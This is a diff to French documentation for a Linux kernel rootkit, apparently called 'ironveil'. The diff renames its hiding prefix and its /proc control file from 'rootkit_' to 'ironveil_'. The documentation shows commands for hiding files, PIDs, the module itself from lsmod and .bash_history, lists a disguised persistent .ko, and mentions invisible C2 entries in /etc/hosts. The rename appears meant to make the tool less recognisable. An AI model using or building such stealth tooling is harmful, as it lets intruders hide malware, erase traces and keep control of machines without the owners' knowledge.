@@ -13,7 +13,7 @@
         ├─ kretprobe: __x64_sys_getdents64  ← cache fichiers et PIDs
         ├─ kretprobe: __x64_sys_kill        ← bloque signaux vers PIDs cachés
         │
-        ├─ proc_create("rootkit_ctrl")      ← interface de contrôle runtime
+        ├─ proc_create("ironveil_ctrl")      ← interface de contrôle runtime
         │
         ├─ persist_install()
         │     ├─ fname_add("system_acl.ko")    ← cache le .ko persistant
@@ -88,21 +88,21 @@ Au chargement, quatre actions sont automatiques :
 
 Deux mécanismes coexistent.
 
-**Préfixe automatique** — tout nom commençant par `rootkit_` est invisible :
+**Préfixe automatique** — tout nom commençant par `ironveil_` est invisible :
 
 ```bash
-touch /tmp/rootkit_secret.txt
-ls /tmp/ | grep rootkit_secret    # rien
+touch /tmp/ironveil_secret.txt
+ls /tmp/ | grep ironveil_secret    # rien
 ls -la /tmp/ | grep rootkit_      # rien
 ```
 
 **Nom arbitraire à la volée** via l'interface de contrôle :
 
 ```bash
-echo "hide_file malware.py" > /proc/rootkit_ctrl
+echo "hide_file malware.py" > /proc/ironveil_ctrl
 ls | grep malware.py              # rien
 
-echo "unhide_file malware.py" > /proc/rootkit_ctrl
+echo "unhide_file malware.py" > /proc/ironveil_ctrl
 ls | grep malware.py              # visible à nouveau
 ```
 
@@ -115,7 +115,7 @@ ls | grep malware.py              # visible à nouveau
 
 ```bash
 # Cacher un PID
-echo "hide_pid 1337" > /proc/rootkit_ctrl
+echo "hide_pid 1337" > /proc/ironveil_ctrl
 
 # Vérifier
 ps aux | grep 1337        # absent
@@ -123,7 +123,7 @@ ls /proc/ | grep 1337     # absent
 kill -0 1337              # retourne "No such process"
 
 # Révéler
-echo "unhide_pid 1337" > /proc/rootkit_ctrl
+echo "unhide_pid 1337" > /proc/ironveil_ctrl
 ```
 
 ```
@@ -376,7 +376,7 @@ done
 
 ---
 
-## Interface de contrôle — /proc/rootkit_ctrl
+## Interface de contrôle — /proc/ironveil_ctrl
 
 Fichier écriture seule, lui-même invisible dans `ls /proc/`.
 
@@ -397,11 +397,11 @@ Utilisation :
 
 ```bash
 # Le fichier n'apparaît pas dans ls /proc/
-ls /proc/ | grep rootkit_ctrl      # rien
+ls /proc/ | grep ironveil_ctrl      # rien
 
 # Mais l'écriture fonctionne
-echo "hide_pid $(pgrep clockvenom.py)" > /proc/rootkit_ctrl
-echo "hide_file .bash_history"    > /proc/rootkit_ctrl
+echo "hide_pid $(pgrep clockvenom.py)" > /proc/ironveil_ctrl
+echo "hide_file .bash_history"    > /proc/ironveil_ctrl
 ```
 
 ---
@@ -419,23 +419,23 @@ insmod ironveil.ko && echo "loaded"
 lsmod | grep ironveil                    # doit retourner rien
 
 # 4. Cacher un fichier (préfixe)
-touch /tmp/rootkit_test
-ls /tmp/ | grep rootkit_test            # rien
+touch /tmp/ironveil_test
+ls /tmp/ | grep ironveil_test            # rien
 
 # 5. Cacher un fichier (runtime)
-echo "hide_file secret.txt" > /proc/rootkit_ctrl
+echo "hide_file secret.txt" > /proc/ironveil_ctrl
 touch /tmp/secret.txt
 ls /tmp/ | grep secret.txt              # rien
-echo "unhide_file secret.txt" > /proc/rootkit_ctrl
+echo "unhide_file secret.txt" > /proc/ironveil_ctrl
 ls /tmp/ | grep secret.txt              # visible
 
 # 6. Cacher un processus
 sleep 999 &
 PID=$!
-echo "hide_pid $PID" > /proc/rootkit_ctrl
+echo "hide_pid $PID" > /proc/ironveil_ctrl
 ps aux | grep "sleep 999"               # absent
 kill -0 $PID 2>&1                       # "No such process"
-echo "unhide_pid $PID" > /proc/rootkit_ctrl
+echo "unhide_pid $PID" > /proc/ironveil_ctrl
 ps aux | grep "sleep 999"               # visible
 
 # 7. /etc/hosts — entrées C2 invisibles
